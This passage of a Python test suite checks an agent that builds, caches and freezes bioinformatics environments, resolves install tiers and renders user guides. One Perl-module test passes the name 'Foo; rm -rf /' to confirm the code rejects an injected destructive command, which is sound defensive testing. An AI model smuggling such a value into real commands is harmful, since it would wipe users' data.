    assert bad.get("outcome") != "proven" and bad.get("code") == "env_build.install_failed", bad


def test_env_recipe_reproduced_is_proven_on_digest_match():
    """env_recipe.reproduced: rebuilding from the recipe alone and converging to
    the recorded content_digest is the honest reproducibility green. `build_fn` is
    injected so the match-logic is proven without Docker; a match REQUIRES both a
    successful build AND digest equality (the paired not_reproduced firewall is
    certified separately)."""
    from agent.skills import env_recipe
    recipe = {"name": "bioinf_x", "version": "1.0",
              "content_digest": "sha256:" + "a" * 64, "conda_deps": ["samtools"]}
    out = env_recipe.rebuild_from_recipe(
        recipe, build_fn=lambda spec, **k: {"success": True,
                                            "content_digest": "sha256:" + "a" * 64})
    assert out.get("outcome") == "proven", out
    assert out.get("code") == "env_recipe.reproduced", out
    assert out.get("content_digest_match") is True
    # and a DRIFTED digest must NOT be proven (the honest negative).
    bad = env_recipe.rebuild_from_recipe(
        recipe, build_fn=lambda spec, **k: {"success": True,
                                            "content_digest": "sha256:" + "b" * 64})
    assert bad.get("outcome") != "proven", bad


# `test_env_build_cache_hit_returns_proven` was here. It covered EnvBuild.build_or_cached
# (deleted — dead code, see env_build.py) and is worth a note as the audit's own thesis in
# miniature: its docstring said "Cache-hit honesty is load-bearing — a wrong hit ships a
# wrong env — so the green must reflect a real anchored lookup", and then handed the code a
# `_FakeCache` whose `lookup_anchored` returns a hard-coded dict. It named the exact risk
# and mocked away the only thing that could detect it. The real cache-hit contract is
# covered by test_envcache_hit_must_still_satisfy_the_honesty_contract, against a real
# EnvCache on a real file.


def test_freeze_cache_hit_returns_proven_artifact_by_hash(monkeypatch):
    """freeze.cache_hit: an anchored EnvCache hit (image confirmed present) returns
    the proven artifact by request_key with NO re-solve — the scale unlock. The
    green must reflect a real anchored lookup (a wrong hit ships a wrong env)."""
    from agent.mcp_tools import freeze_tools
    from agent import mcp_server as _ms
    digest = "sha256:" + "a" * 64
    monkeypatch.setattr(_ms, "_check_disk_failsafe", lambda: None)
    monkeypatch.setattr(_ms, "_check_docker_available", lambda: None)
    monkeypatch.setattr(_ms._env_cache, "lookup_anchored",
                        lambda rkey, present: {"image": "img", "image_digest": digest,
                                               "content_digest": digest, "mode": "build"})
    out = freeze_tools.freeze(env_name="bioinf_cached_zzz", tools=["samtools=1.21"])
    assert out.get("outcome") == "proven", out
    assert out.get("code") == "freeze.cache_hit", out
    assert out.get("cache_hit") is True


def test_freeze_adopt_honesty_refuses_policy_violating_biocontainer(monkeypatch):
    """ADVERSARIAL (adopt-path POLICY_CLEAN firewall). Adopting a published
    BioContainer skips VALIDATED_IN_IMAGE (its bytes are trusted by digest) but
    POLICY_CLEAN (I12 accelerator / I13 license) STILL must hold — those describe
    what WE declare on the artifact. Attack: adopt a pure-conda samtools while
    claiming accel='cuda' with NO toolkit_version. freeze must REFUSE at the adopt
    gate (freeze.adopt_honesty), never emit a 'POLICY_CLEAN' badge it never checked
    (the dorado-stress D2 hole). No docker: biocontainer resolver + cache mocked."""
    from agent.mcp_tools import freeze_tools
    from agent import mcp_server as _ms
    digest = "sha256:" + "a" * 64
    monkeypatch.setattr(_ms._biocontainers, "resolve_biocontainer",
                        lambda parsed, **k: {"found": True, "digest": digest,
                                             "image_by_digest": f"quay.io/biocontainers/samtools@{digest}"})
    monkeypatch.setattr(_ms._env_cache, "lookup_anchored", lambda rkey, present: None)
    monkeypatch.setattr(_ms, "_check_disk_failsafe", lambda: None)
    monkeypatch.setattr(_ms, "_check_docker_available", lambda: None)

    out = freeze_tools.freeze(env_name="bioinf_st_adopt_unit",
                              tools=["samtools=1.21"], accel="cuda")   # cuda, NO toolkit_version
    assert out.get("outcome") == "refused", out
    assert out.get("code") == "freeze.adopt_honesty", out
    assert out.get("violation_count", 0) >= 1 and out.get("honesty_violations"), out
    # the refusal must name the I12 accelerator invariant it fired on (legible).
    assert any("I12" in (v.get("invariant", "")) for v in out["honesty_violations"]), out


# ---------------------------------------------------------------------------
# Re-spine Slice 2/3: Perl/CPAN + cargo/go tiers
# ---------------------------------------------------------------------------

def test_perl_module_load_evidence_shape():
    """perl_module_load anchors on rc==0 and rejects an injection-unsafe module
    name without running anything."""
    from agent.skills import evidence

    class _FakeEM:
        def __init__(self, rc): self.rc = rc
        def run_in_env(self, env, cmd, timeout=0):
            return {"returncode": self.rc, "stdout": "", "stderr": ""}

    ok = evidence.perl_module_load(_FakeEM(0), "e", "Bio::DB::HTS")
    assert ok["anchored"] is True and ok["detail"] == "Bio::DB::HTS"
    miss = evidence.perl_module_load(_FakeEM(2), "e", "Nonexistent::Module")
    assert miss["anchored"] is False
    # Injection-unsafe name is rejected pre-exec (no run, not anchored).
    bad = evidence.perl_module_load(_FakeEM(0), "e", "Foo; rm -rf /")
    assert bad["anchored"] is False and "invalid" in bad["detail"]


def test_install_method_accepts_new_tier_types():
    """The InstallMethod type union must accept the new tiers so their
    install_steps round-trip through the spec model."""
    from agent.models.core_data import InstallMethod
    for t in ("perl", "cargo", "go", "binary"):
        m = InstallMethod(type=t, source="x")
        assert m.type == t


# ---------------------------------------------------------------------------
# Re-spine Slice 4: I12 accelerator honesty + I13 license/redistribution
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# Re-spine Slice 5a: BioContainers / mulled adoption (freeze's adopt-by-digest)
# ---------------------------------------------------------------------------

def test_mulled_v2_name_matches_canonical_oracle():
    """Our self-contained mulled-v2 name must match galaxy's canonical
    v2_image_name exactly (SHA1). Vectors generated from galaxy-tool-util — if
    these drift, adopt-by-digest silently stops finding real images."""
    from agent.skills.biocontainers import mulled_v2_name
    P = "mulled-v2-fe8faa35dbf6dc65a0f7f5d4ea12e31a79f73e40"   # sha1(bwa\nsamtools)
    assert mulled_v2_name([("samtools", "1.21")]) == "samtools:1.21"
    assert mulled_v2_name([("samtools", None)]) == "samtools"
    assert mulled_v2_name([("bwa", "0.7.17"), ("samtools", "1.21")]) == \
        f"{P}:93034fdc1427845187877ba74191d0963fd1cad3"
    assert mulled_v2_name([("samtools", "1.3.1"), ("bwa", "0.7.13")]) == \
        f"{P}:4d0535c94ef45be8459f429561f0894c3fe0ebcf"
    assert mulled_v2_name([("samtools", "1.3.1"), ("bwa", None)]) == \
        f"{P}:b0c847e4fb89c343b04036e33b2daa19c4152cf5"
    assert mulled_v2_name([("samtools", None), ("bwa", None)]) == P
    assert mulled_v2_name([("samtools", "1.3.1"), ("bwa", "0.7.13")], image_build="0") == \
        f"{P}:4d0535c94ef45be8459f429561f0894c3fe0ebcf-0"


def test_mulled_v2_name_is_order_independent_and_lowercases():
    from agent.skills.biocontainers import mulled_v2_name
    a = mulled_v2_name([("BWA", "0.7.17"), ("Samtools", "1.21")])
    b = mulled_v2_name([("samtools", "1.21"), ("bwa", "0.7.17")])
    assert a == b == "mulled-v2-fe8faa35dbf6dc65a0f7f5d4ea12e31a79f73e40:93034fdc1427845187877ba74191d0963fd1cad3"


def test_build_number_ranking():
    from agent.skills.biocontainers import _build_number
    assert _build_number("1.21--h96c455f_1") == 1
    assert _build_number("1.21--h50ea8bc_0") == 0
    assert _build_number("66ed1b38d280722529bb8a0167b0cf02f8a0b488-0") == 0
    assert _build_number("1476e745a911a5a2ac22207311b275c51e745ba9-2") == 2
    assert _build_number("noversion") == -1


@pytest.mark.live
def test_resolve_biocontainer_single_tool_live():
    """Live adoption against quay.io for a tool that definitely has a
    biocontainer (samtools 1.21). Network-guarded: skips if the registry is
    unreachable so the suite stays green offline."""
    import pytest as _pytest
    from agent.skills.biocontainers import resolve_biocontainer
    res = resolve_biocontainer([("samtools", "1.21")], timeout=20)
    if not res.get("found"):
        _pytest.skip(f"quay.io unreachable or tag absent: {res.get('reason')}")
    assert res["repo"] == "samtools"
    assert res["tag"].startswith("1.21--")
    assert res["digest"].startswith("sha256:")
    assert res["image_by_digest"].startswith("quay.io/biocontainers/samtools@sha256:")


# ---------------------------------------------------------------------------
# Re-spine Slice 5b: content-addressing (content_digest / request_key / cache)
# ---------------------------------------------------------------------------

def test_request_key_is_order_independent():
    """Order-independent in tools; platform canonicalized (D6 fix: conda-form
    'linux-64' and Docker-form 'linux/amd64' collapse to one canonical token,
    avoiding the duplicate-cache-key pollution seen in the dorado audit)."""
    from agent.skills.freeze import request_key
    a = request_key([("samtools", "1.21"), ("bwa", "0.7.17")], "linux-64")
    b = request_key([("bwa", "0.7.17"), ("samtools", "1.21")], "linux-64", accel="none")
    assert a == b == "bwa=0.7.17,samtools=1.21|linux/amd64|none"
    # platform canonicalization: docker-form ↔ conda-form share one key
    assert request_key([("x", "1")], "linux-64") == request_key([("x", "1")], "linux/amd64")
    # but distinct platforms remain distinct
    assert request_key([("x", "1")], "osx-arm64") != request_key([("x", "1")], "linux-64")
    assert request_key([("x", "1")], "linux-64", "cuda") != request_key([("x", "1")], "linux-64")


def test_record_content_digest_picks_the_what_was_got_anchor():
    """The freeze anchor by mode: EnvBuild digest for a build, biocontainer manifest
    digest for an adopt, request hash only as a last resort. Distinct envs get
    distinct anchors (no false content collision)."""
    from agent.skills.freeze import record_content_digest
    # build → the EnvBuild lock+longtail digest (the one in the recipe / verify).
    assert record_content_digest("build", build_digest="sha256:BUILD",
                                 adopt_digest="sha256:ADOPT", fallback="sha256:FB") == "sha256:BUILD"
    # adopt → the biocontainer manifest digest.
    assert record_content_digest("adopt", adopt_digest="sha256:ADOPT",
                                 fallback="sha256:FB") == "sha256:ADOPT"
    # missing mode-specific digest → fallback (never silently empty).
    assert record_content_digest("build", build_digest="", fallback="sha256:FB") == "sha256:FB"
    # two builds with different EnvBuild digests → different anchors (the fix).
    assert (record_content_digest("build", build_digest="sha256:A")
            != record_content_digest("build", build_digest="sha256:B"))


def test_env_cache_roundtrip(tmp_path):
    from agent.skills.freeze import EnvCache, request_key
    cache = EnvCache(tmp_path / "env_cache.json")
    key = request_key([("samtools", "1.21")], "linux-64")
    assert cache.lookup(key) is None
    rec = {"content_digest": "sha256:abc", "image": "quay.io/biocontainers/samtools@sha256:def"}
    cache.register(key, rec)
    # New instance reads the persisted store (survives process boundary).
    again = EnvCache(tmp_path / "env_cache.json")
    assert again.lookup(key) == rec
    assert key in again.all()
    # A corrupt file must FAIL LOUD, not silently degrade to empty (which would let
    # the next register() overwrite it and lose every recorded env). This is the
    # fail-loud half of the durability fix — see tests/test_envcache_durability.py.
    (tmp_path / "env_cache.json").write_text("{ not json")
    with pytest.raises(RuntimeError):
        EnvCache(tmp_path / "env_cache.json").lookup(key)


# ---------------------------------------------------------------------------
# Re-spine Slice 5c: freeze() orchestration helpers (HPC delivery, record)
# ---------------------------------------------------------------------------

def test_parse_tools_handles_eq_and_bare():
    from agent.skills.freeze import parse_tools
    assert parse_tools(["samtools=1.21", "bwa==0.7.17", "fastqc", " "]) == \
        [("samtools", "1.21"), ("bwa", "0.7.17"), ("fastqc", None)]


def test_apptainer_delivery_picks_correct_route():
    from agent.skills.freeze import apptainer_delivery
    # Adopted public biocontainer → pull by digest, no transfer.
    a = apptainer_delivery(mode="adopt", sif_name="x.sif",
                           image_by_digest="quay.io/biocontainers/samtools@sha256:abc")
    assert "apptainer pull x.sif docker://quay.io/biocontainers/samtools@sha256:abc" in a["get_image"]
    # Built + pushed → pull the pushed ref.
    b = apptainer_delivery(mode="build", sif_name="x.sif", push_target="reg/img:1", tarball="/d/x.tar")
    assert "apptainer pull x.sif docker://reg/img:1" in b["get_image"]
    # Built, no push → registry-free docker-archive.
    c = apptainer_delivery(mode="build", sif_name="x.sif", tarball="/d/x.tar")
    assert "docker-archive://x.tar" in c["get_image"] and "apptainer build" in c["get_image"]
    # Gated ALWAYS tarball-only, even if a push_target is supplied (I13).
    d = apptainer_delivery(mode="build", sif_name="x.sif", push_target="reg/img:1",
                           tarball="/d/x.tar", gated=True)
    assert "docker-archive://x.tar" in d["get_image"]
    assert "pull" not in d["get_image"]
    assert "license-gated" in d["source_note"]
    # Every route carries a SLURM template + bind run example.
    for r in (a, b, c, d):
        assert "module load apptainer" in r["sbatch_template"]
        assert "--bind /scratch/$USER/data:/data" in r["run_example"]


def test_freeze_record_derives_redistributable_from_gated():
    from agent.skills.freeze import freeze_record
    rec = freeze_record(request_key="k", content_digest="sha256:c", mode="build",
                        image="img:1", image_digest="sha256:i", platform="linux-64",
                        gated=True, hpc={"get_image": "..."})
    # `license_gated` is the CANONICAL key — the same name env_honesty._check_license
    # reads and the same field on the pydantic model. It used to be emitted as `gated`,
    # so I13 silently never fired on the one path that hands this record straight to
    # check_build (freeze_from_image). One concept, one name (audit 2026-07-16).
    assert rec["redistributable"] is False and rec["license_gated"] is True
    assert "gated" not in rec, "the legacy alias must not be re-introduced alongside it"
    rec2 = freeze_record(request_key="k", content_digest="sha256:c", mode="adopt",
                         image="q@sha256:d", image_digest="sha256:d", platform="linux-64",
                         gated=False)
    assert rec2["redistributable"] is True and rec2["created_at"]


def test_record_is_gated_reads_new_and_legacy_records():
    """EnvCache records written before the rename carry `gated`; the helper is the single
    reader so the two names can never drift apart again."""
    from agent.models.core_data import record_is_gated
    assert record_is_gated({"license_gated": True}) is True
    assert record_is_gated({"license_gated": False}) is False
    assert record_is_gated({"gated": True}) is True            # legacy, on disk today
    assert record_is_gated({"gated": False}) is False
    assert record_is_gated({}) is False
    # canonical wins when both are somehow present
    assert record_is_gated({"license_gated": True, "gated": False}) is True


# ---------------------------------------------------------------------------
# Re-spine: resolver (tier selection + ResolutionDecision) — ranking is pure
# ---------------------------------------------------------------------------

def test_rank_decision_prefers_conda_records_alternatives():
    from agent.skills.resolver import rank_decision
    avail = {"conda": {"available": True, "channel": "bioconda"},
             "pip": {"available": True}, "cran": {"available": False}}
    d = rank_decision(avail)
    assert d["chosen"] == "conda"
    assert [a["tier"] for a in d["alternatives"]] == ["pip"]
    assert "conda" in d["rationale"] and "pip" in d["rationale"]


def test_rank_decision_prefer_override_and_fallthrough():
    from agent.skills.resolver import rank_decision
    avail = {"conda": {"available": True}, "pip": {"available": True}}
    assert rank_decision(avail, prefer="pip")["chosen"] == "pip"
    # prefer a tier that isn't available → ignored, normal order wins
    assert rank_decision(avail, prefer="source")["chosen"] == "conda"
    # only a lower tier available → it is chosen
    assert rank_decision({"source": {"available": True}})["chosen"] == "source"
    # nothing available → no tier
    assert rank_decision({"conda": {"available": False}})["chosen"] is None


def test_an_ignored_prefer_is_disclosed_never_silent():
    """The caller asked for a tier and did NOT get it. Say so.

    This test's neighbour above asserts `prefer='source'` → conda and calls that
    "ignored, normal order wins" — it encoded the SILENCE as correct. It isn't:
    a caller who passes prefer='pip' and receives conda cannot tell that from
    conda being what they asked for, and a TYPO ('spak') produced the exact same
    confident conda install_call as a real fallback. Same shape as every other
    finding in this audit — the information existed and reached nobody."""
    from agent.skills.resolver import rank_decision
    avail = {"conda": {"available": True}}

    # honored → no noise (a warning that fires when nothing is wrong gets skipped)
    ok = rank_decision(avail, prefer="conda")
    assert ok["prefer_honored"] is True and not ok["prefer_ignored_reason"]
    # not passed at all → not a judgement either way
    assert rank_decision(avail)["prefer_honored"] is None

    # unavailable tier → ignored, and SAID so
    miss = rank_decision(avail, prefer="pip")
    assert miss["chosen"] == "conda"
    assert miss["prefer_honored"] is False
    assert "IGNORED" in miss["prefer_ignored_reason"]
    assert "pip" in miss["rationale"] and "IGNORED" in miss["rationale"]

    # a typo must not read like a considered fallback — name it as unknown
    typo = rank_decision(avail, prefer="spak")
    assert typo["prefer_honored"] is False
    assert "not a known tier" in typo["prefer_ignored_reason"]

    # and it survives to the string an agent actually copies + runs
    import agent.skills.resolver as R
    R_probe = dict(probe_conda=R.probe_conda, probe_pypi=R.probe_pypi, probe_cran=R.probe_cran,
                   probe_bioconductor=R.probe_bioconductor,
                   probe_authors_sources=R.probe_authors_sources)
    try:
        R.probe_conda = lambda n, t=12: {"available": True, "channel": "bioconda",
                                         "latest": "1.21", "summary": "SAM BAM CRAM files"}
        R.probe_pypi = R.probe_cran = R.probe_bioconductor = lambda n, t=12: {"available": False}
        R.probe_authors_sources = lambda *a, **k: {}
        call = R.resolve("samtools", prefer="spak")["install_call"]
        assert call.startswith("#"), "the doubt must lead the copied string, not sit in a sibling key"
        assert "IGNORED" in call and "NOT the one you asked for" in call
        assert "install_conda_packages" in call, "still usable — disclosure is not refusal"
    finally:
        for k, v in R_probe.items():
            setattr(R, k, v)


def test_install_call_maps_each_tier_to_its_primitive():
    from agent.skills.resolver import _install_call
    assert "install_conda_packages" in _install_call("conda", "samtools", "1.21", {"channel": "bioconda"}, "")
    assert "install_pip_package" in _install_call("pip", "multiqc", "1.21", {}, "")
    assert 'source="cran"' in _install_call("cran", "ape", "", {}, "")
    assert 'source="bioconductor"' in _install_call("bioconductor", "DESeq2", "", {}, "")
    assert "install_release_binary" in _install_call("binary", "mosdepth", "", {"assets": ["http://x/mosdepth"]}, "brentp/mosdepth")
    assert "install_git_repo" in _install_call("source", "thing", "", {}, "owner/thing")


@pytest.mark.live
def test_resolve_live_samtools_chooses_conda():
    """Live resolve: samtools is on bioconda, so the resolver must choose the
    conda tier. Network-guarded — skips if registries are unreachable."""
    import pytest as _pytest
    from agent.skills.resolver import resolve
    d = resolve("samtools", timeout=15)
    if not d.get("chosen"):
        _pytest.skip("registries unreachable")
    assert d["chosen"] == "conda", f"expected conda for samtools, got {d['chosen']} ({d['probed']})"
    assert "install_conda_packages" in d["install_call"]


def test_is_ambiguous_only_for_python_plus_r_without_hint():
    from agent.skills.resolver import _is_ambiguous
    both = {"pip": {"available": True}, "cran": {"available": True}}
    assert _is_ambiguous(both, "") is True            # collision, no hint
    assert _is_ambiguous(both, "r") is False           # hint removes ambiguity
    assert _is_ambiguous(both, "python") is False
    assert _is_ambiguous({"conda": {"available": True}, "pip": {"available": True}}, "") is False
    assert _is_ambiguous({"cran": {"available": True}}, "") is False


def test_anchored_to_github_repo_url_matching():
    """The metadata-anchor helper used to detect cross-namespace name collisions.
    Matches github.com/owner/repo (case-insensitive) AND the owner.github.io/repo
    docs-site form. False on empty / non-github URLs / partial matches."""
    from agent.skills.resolver import _anchored_to_github_repo
    target = "althonos/pyhmmer"
    # canonical github URL — match
    assert _anchored_to_github_repo(["https://github.com/althonos/pyhmmer"], target)
    # case-insensitive
    assert _anchored_to_github_repo(["https://GitHub.com/Althonos/PyHMMER"], target)
    # github.io docs site form
    assert _anchored_to_github_repo(["https://althonos.github.io/pyhmmer/"], target)
    # subpath under the repo (issues, releases, ...) — match
    assert _anchored_to_github_repo(["https://github.com/althonos/pyhmmer/issues"], target)
    # unrelated GitHub repo — no match (this is the GAB case)
    assert not _anchored_to_github_repo(
        ["https://github.com/some-other-org/gab"], "baumannlab/Genome_Assembly_Booster")
    # PyPI URL alone doesn't anchor — repo metadata must say so explicitly
    assert not _anchored_to_github_repo(["https://pypi.org/project/gab/"], target)
    # empty + malformed
    assert not _anchored_to_github_repo([], target)
    assert not _anchored_to_github_repo([""], target)
    assert not _anchored_to_github_repo(["https://github.com/althonos/pyhmmer"], "")
    assert not _anchored_to_github_repo(["https://github.com/althonos/pyhmmer"], "no-slash")


def test_resolve_cross_namespace_collision_disqualifies_pip(monkeypatch):
    """The GAB bug regression: when github_repo is provided AND a same-name
    PyPI hit exists whose metadata does NOT reference that repo, the resolver
    MUST disqualify pip from ranking (not return chosen=pip with an unrelated
    package). The collision is recorded in cross_namespace_collisions so the
    caller can see what was rejected and why."""
    from agent.skills import resolver as r

    # Simulate the exact GAB scenario: PyPI has a `gab` (an unrelated chat-bot
    # library at v0.0.1), user provides github_repo=baumannlab/Genome_Assembly_Booster.
    monkeypatch.setattr(r, "probe_conda", lambda n, t=12: {"available": False})
    monkeypatch.setattr(r, "probe_pypi", lambda n, t=12: {
        "available": True, "latest": "0.0.1",
        "home_page": "https://github.com/some-unrelated-author/gab-chatbot",
        "project_urls": {"Source": "https://github.com/some-unrelated-author/gab-chatbot"},
        "package_url": "https://pypi.org/project/gab/",
    })
    monkeypatch.setattr(r, "probe_cran", lambda n, t=12: {"available": False})
    monkeypatch.setattr(r, "probe_bioconductor", lambda n, t=12: {"available": False})
    monkeypatch.setattr(r, "probe_github", lambda repo, t=12: {
        "repo_exists": True, "has_release_assets": False, "assets": [],
    })

    d = r.resolve("gab", github_repo="baumannlab/Genome_Assembly_Booster", timeout=5)

    # The pip tier MUST be disqualified — chosen is NOT pip.
    assert d["chosen"] != "pip", \
        ("PyPI's same-name unrelated package was confidently picked; the cross-"
         f"namespace collision guard failed. chosen={d['chosen']!r}; rationale={d['rationale']!r}")
    # Chosen is one of the github-anchored tiers (synthesis/source/binary).
    assert d["chosen"] in ("synthesis", "source"), \
        f"expected synthesis or source for github_repo-anchored resolve; got {d['chosen']!r}"
    # Collision is RECORDED so the agent can see it.
    assert d["cross_namespace_collisions"], "collision must be surfaced, not silenced"
    coll = d["cross_namespace_collisions"][0]
    assert coll["tier"] == "pip" and coll["name"] == "gab"
    assert "baumannlab/Genome_Assembly_Booster" in coll["reason"]
    # Probed availability shows pip was disqualified.
    assert d["probed"]["pip"]["available"] is False
    assert d["probed"]["pip"]["cross_namespace_collision"] is True
    # Rationale leads with REJECTED so an agent reading it sees the problem.
    assert "REJECTED" in d["rationale"] and "cross-namespace" in d["rationale"]


def test_resolve_pip_anchored_to_repo_is_kept(monkeypatch):
    """Corollary: when PyPI's metadata DOES reference the supplied github_repo,
    the pip tier stays in ranking. Don't disqualify legitimate same-project
    hits — only collisions."""
    from agent.skills import resolver as r

    monkeypatch.setattr(r, "probe_conda", lambda n, t=12: {"available": False})
    monkeypatch.setattr(r, "probe_pypi", lambda n, t=12: {
        "available": True, "latest": "0.10.15",
        "home_page": "https://github.com/althonos/pyhmmer",
        "project_urls": {"Repository": "https://github.com/althonos/pyhmmer",
                         "Documentation": "https://althonos.github.io/pyhmmer/"},
        "package_url": "https://pypi.org/project/pyhmmer/",
    })
    monkeypatch.setattr(r, "probe_cran", lambda n, t=12: {"available": False})
    monkeypatch.setattr(r, "probe_bioconductor", lambda n, t=12: {"available": False})
    monkeypatch.setattr(r, "probe_github", lambda repo, t=12: {
        "repo_exists": True, "has_release_assets": False, "assets": [],
    })

    d = r.resolve("pyhmmer", github_repo="althonos/pyhmmer", timeout=5)
    assert d["chosen"] == "pip", \
        ("pyhmmer's PyPI metadata anchors to althonos/pyhmmer (same project) — "
         f"pip MUST stay in ranking. Got {d['chosen']!r}.")
    assert not d["cross_namespace_collisions"]
    assert d["probed"]["pip"]["available"] is True


def test_resolve_no_github_repo_no_collision_check(monkeypatch):
    """Without github_repo there's nothing to anchor against — the resolver
    must not invent collisions and the existing behavior is preserved."""
    from agent.skills import resolver as r

    monkeypatch.setattr(r, "probe_conda", lambda n, t=12: {"available": False})
    monkeypatch.setattr(r, "probe_pypi", lambda n, t=12: {
        "available": True, "latest": "0.0.1",
        "home_page": "", "project_urls": {}, "package_url": "",
    })
    monkeypatch.setattr(r, "probe_cran", lambda n, t=12: {"available": False})
    monkeypatch.setattr(r, "probe_bioconductor", lambda n, t=12: {"available": False})

    d = r.resolve("gab", timeout=5)   # NO github_repo
    assert d["chosen"] == "pip"
    assert d["cross_namespace_collisions"] == []
    assert "REJECTED" not in d["rationale"]


def test_resolve_cran_cross_namespace_collision(monkeypatch):
    """Same guard for CRAN: when github_repo is provided AND a same-name CRAN
    package exists whose URL doesn't reference that repo, CRAN is disqualified.
    CRAN URLs are comma-separated; the parser must handle that shape."""
    from agent.skills import resolver as r

    monkeypatch.setattr(r, "probe_conda", lambda n, t=12: {"available": False})
    monkeypatch.setattr(r, "probe_pypi", lambda n, t=12: {"available": False})
    monkeypatch.setattr(r, "probe_cran", lambda n, t=12: {
        "available": True, "latest": "1.0",
        "url": "https://example.com/random-cran-package, https://example.com/docs",
        "bug_reports": "https://example.com/bugs",
    })
    monkeypatch.setattr(r, "probe_bioconductor", lambda n, t=12: {"available": False})
    monkeypatch.setattr(r, "probe_github", lambda repo, t=12: {
        "repo_exists": True, "has_release_assets": False, "assets": [],
    })

    d = r.resolve("x", github_repo="someone/x-real", timeout=5)
    assert d["chosen"] in ("synthesis", "source"), \
        f"CRAN collision was not disqualified; got {d['chosen']!r}"
    assert any(c["tier"] == "cran" for c in d["cross_namespace_collisions"])
    assert d["probed"]["cran"]["available"] is False


@pytest.mark.live
def test_resolve_live_ape_disambiguated_by_language():
    """The collision finding, fixed: bare 'ape' is flagged ambiguous (PyPI vs
    CRAN), and language='r' steers it to an R tier (cran/bioconductor/conda
    r-ape), never pip. Network-guarded."""
    import pytest as _pytest
    from agent.skills.resolver import resolve
    bare = resolve("ape", timeout=15)
    if not bare.get("probed", {}).get("pip", {}).get("available") or \
       not bare.get("probed", {}).get("cran", {}).get("available"):
        _pytest.skip("ape not present in both PyPI and CRAN right now")
    assert bare["ambiguous"] is True
    assert "AMBIGUOUS" in bare["rationale"]
    r = resolve("ape", language="r", timeout=15)
    assert r["ambiguous"] is False
    assert r["chosen"] in ("conda", "cran", "bioconductor"), f"R tool went to {r['chosen']}"
    assert r["chosen"] != "pip"


# ---------------------------------------------------------------------------
# Re-spine Layer 2: user-guide generator (rendered from the passing run)
# ---------------------------------------------------------------------------

def _guide_spec():
    return {
        "pipeline_name": "bwa_samtools",
        "description": "Align reads and sort.",
        "conda_env": "bioinf_bwa_samtools",
        "python_version": "3.11",
        "lock_sha256": "abc123",
        "env_status": "fully_validated",
        "pipeline_status": "fully_validated",
        "usage_verified": True,
        "packages": [{"name": "bwa", "version": "0.7.17", "verify_output": "x"},
                     {"name": "samtools", "version": "1.21", "verify_output": "y"}],
        "pipeline_steps": [
            {"step": 1, "command": "bwa mem ref.fa r1.fq > out.sam", "returncode": 0,
             "detected_outputs": ["/abs/out.sam"], "validation": {"out.sam": {"valid": True}}},
            {"step": 2, "command": "SHOULD_NOT_APPEAR --broken", "returncode": 1,
             "detected_outputs": []},
        ],
        "usage": {"command_template": "bwa mem {REF} {READS} | samtools sort -o {OUT_DIR}/x.bam",
                  "inputs": [{"name": "REF", "format": "fasta"}],
                  "outputs": [{"files": "*.bam"}]},
    }


def test_executed_commands_only_validated_and_run():
    from agent.skills.user_guide import executed_commands
    cmds = [c["command"] for c in executed_commands(_guide_spec())]
    assert "bwa mem ref.fa r1.fq > out.sam" in cmds        # rc=0 + validated
    assert any("samtools sort" in c for c in cmds)          # self-tested usage
    assert not any("SHOULD_NOT_APPEAR" in c for c in cmds)  # failed step excluded


def test_render_user_guide_excludes_unrun_and_pins_env():
    from agent.skills.user_guide import render_user_guide
    fr = {
        "content_digest": "sha256:cd", "image": "quay.io/biocontainers/x@sha256:img",
        "image_digest": "sha256:img",
        "hpc_delivery": {
            "source_note": "adopted public BioContainer",
            "get_image": "apptainer pull bwa_samtools.sif docker://quay.io/biocontainers/x@sha256:img",
            "run_example": "apptainer exec --bind /scratch/$USER/data:/data bwa_samtools.sif <command>",
            "sbatch_template": "#!/bin/bash\nmodule load apptainer\n",
        },
    }
    md = render_user_guide(_guide_spec(), freeze_record=fr)
    assert "SHOULD_NOT_APPEAR" not in md                      # failed command never shown
    assert "bwa mem ref.fa r1.fq" in md                       # validated command shown
    assert "apptainer pull bwa_samtools.sif docker://quay.io/biocontainers/x@sha256:img" in md
    assert "sha256:cd" in md and "module load apptainer" in md
    assert "conda env: `bioinf_bwa_samtools`" in md           # driver env recorded


def test_render_user_guide_without_freeze_falls_back_to_docker():
    from agent.skills.user_guide import render_user_guide
    s = _guide_spec()
    s["docker"] = {"image_tag": "bwa_samtools:1.21"}
    md = render_user_guide(s, freeze_record=None)
    assert "apptainer pull" in md and "bwa_samtools:1.21" in md


def test_user_guide_derives_packages_from_install_steps_on_draft():
    """Regression for the end-to-end finding: spec.packages is finalize-derived,
    so on a DRAFT the guide must reconstruct the env details from install_steps
    rather than rendering an empty section."""
    from agent.skills.user_guide import render_user_guide
    draft = {
        "pipeline_name": "x", "conda_env": "bioinf_x",
        "packages": [],   # not materialized pre-finalize
        "install_steps": [{"step": 1, "installed_packages": [
            {"name": "samtools", "version": "1.21"},
            {"name": "bwa", "version": "0.7.17"}]}],
        "pipeline_steps": [],
    }
    md = render_user_guide(draft)
    assert "conda env: `bioinf_x`" in md
    assert "samtools=1.21" in md and "bwa=0.7.17" in md


# ---------------------------------------------------------------------------
# Re-spine: two-spec split — Layer 2 WorkflowSpec + workflow-invariant subset
# ---------------------------------------------------------------------------

def test_check_workflow_invariants_filters_to_run_side():
    """The workflow check enforces ONLY the run-side invariants (I0/I3/I6/I7/I8)
    — env-build violations (e.g. I2 unverified package) belong to Layer 1 and
    must NOT block a workflow seal."""
    from agent.skills.spec_writer import check_workflow_invariants
    spec = {
        "pipeline_name": "t",
        # I2 env-side violation: package with no verify_output
        "packages": [{"name": "tool"}],
        "install_steps": [{"step": 1, "returncode": 0}],
        # I3 run-side violation: rc=0 step, output, no validation
        "pipeline_steps": [{"step": 1, "returncode": 0,
                            "detected_outputs": ["/abs/o.txt"]}],
    }
    inv = check_workflow_invariants(spec)
    tiers = {v["invariant"].split(".")[0] for v in inv}
    assert "I3" in tiers, f"workflow check must surface I3; got {inv}"
    assert "I2" not in tiers, f"workflow check must NOT include env-side I2; got {inv}"


def test_workflow_spec_pins_env_by_digest():
    """A WorkflowSpec references its environment by content digest (the Layer-1
    artifact) rather than embedding the env build."""
    from agent.models.core_data import WorkflowSpec
    wf = WorkflowSpec(
        workflow_name="samtools_workflow", description="sort bams",
        created_at="2026-05-23T00:00:00",
        env_request_key="samtools=1.21|linux-64|none",
        env_content_digest="sha256:abc",
        env_image="quay.io/biocontainers/samtools@sha256:d158",
        pipeline_status="fully_validated", usage_verified=True,
        driver_env={"conda_env": "bioinf_samtools", "python_version": "3.11"},
    )
    assert wf.env_content_digest == "sha256:abc"
    assert "samtools@sha256" in wf.env_image
